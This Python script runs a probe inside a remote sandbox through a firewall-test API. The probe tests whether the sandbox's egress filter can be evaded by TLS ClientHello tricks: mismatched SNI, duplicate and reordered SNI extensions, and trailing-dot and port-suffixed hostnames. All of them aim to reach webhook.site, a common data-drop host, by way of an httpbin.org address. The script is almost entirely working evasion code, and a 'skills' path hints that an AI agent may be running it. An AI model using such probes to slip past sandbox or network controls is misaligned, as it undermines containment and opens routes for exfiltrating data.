# -*- coding: utf-8 -*-
"""Phase16: 标准 ssl 栈基线 + 修正手工 CH 双 SNI 变体"""
import sys, time, struct
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM

SID = "sbx_o0Y6cTITVCkhqbFEcwBqzaZHqLC8"  # fwtest7, custom webhook.site

GUEST = r'''
import socket, struct, ssl, os

def std_tls(ip, port, hostname, label=''):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(6)
        s.connect((ip, port))
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        tls = ctx.wrap_socket(s, server_hostname=hostname)
        tls.sendall(b'GET /anything HTTP/1.1\r\nHost: webhook.site\r\nConnection: close\r\n\r\n')
        tls.settimeout(6)
        r = tls.recv(400)
        print('[%s %s:%d] TLS OK ver=%s resp: %r' % (label, ip, port, tls.version(), r[:100]), flush=True)
        tls.close()
    except Exception as e:
        print('[%s %s:%d] EXC %s: %s' % (label, ip, port, type(e).__name__, e), flush=True)

def tls13_ch(snis):
    body = b'\x03\x03' + os.urandom(32) + b'\x00' + b'\x00\x02\x13\x01' + b'\x01\x00'
    ext = b''
    ext += b'\x00\x2b\x00\x03\x02\x03\x04'                                   # supported_versions 1.3
    ext += b'\x00\x33\x00\x24\x00\x1d\x00\x20' + os.urandom(32)             # key_share X25519 random
    ext += b'\x00\x0d\x00\x06\x00\x04\x08\x04\x04\x03'                      # sig_algs
    for sni in snis:
        n = sni.encode()
        ext += b'\x00\x00' + struct.pack('>H', len(n) + 5) + b'\x00' + bytes([len(n)]) + n
    body += struct.pack('>H', len(ext)) + ext
    hs = b'\x01' + len(body).to_bytes(3, 'big') + body
    return b'\x16\x03\x01' + struct.pack('>H', len(hs)) + hs

def hand_ch(ip, port, snis, label=''):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(6)
        s.connect((ip, port))
        s.sendall(tls13_ch(snis))
        try:
            r = s.recv(300)
            if r.startswith(b'\x16'):
                print('[%s %s:%d] ServerHello(len=%d)!' % (label, ip, port, len(r)), flush=True)
            else:
                print('[%s %s:%d] resp: %r' % (label, ip, port, r[:60]), flush=True)
        except socket.timeout:
            print('[%s %s:%d] TIMEOUT' % (label, ip, port), flush=True)
        s.close()
    except Exception as e:
        print('[%s %s:%d] EXC %s: %s' % (label, ip, port, type(e).__name__, e), flush=True)

# A: 标准 ssl 栈基线
std_tls('178.63.67.153', 443, 'webhook.site', 'std-wh-ip+wh-sni')
std_tls('34.195.135.204', 443, 'webhook.site', 'std-np-ip+wh-sni')   # 关键: 按SNI转发?
std_tls('34.195.135.204', 443, 'httpbin.org', 'std-np-ip+np-sni')   # 拒
# B: 修正手工 CH
hand_ch('178.63.67.153', 443, ['webhook.site'], 'ch-wh-ip+wh-sni')
hand_ch('34.195.135.204', 443, ['httpbin.org'], 'ch-np-ip+np-sni')
hand_ch('34.195.135.204', 443, ['httpbin.org', 'webhook.site'], 'ch-dual-np+wh')
hand_ch('34.195.135.204', 443, ['webhook.site', 'httpbin.org'], 'ch-dual-wh+np')
hand_ch('34.195.135.204', 443, ['webhook.site.'], 'ch-dot')
hand_ch('34.195.135.204', 443, ['webhook.site:443'], 'ch-port')
print('done', flush=True)
'''

code = "cat > /tmp/pg24.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg24.py"

if __name__ == "__main__":
    c, r = cmd(SID, "bash", ["-lc", code], timeout_ms=120000)
    print('cmd:', c, flush=True)
    print(r[:5500], flush=True)
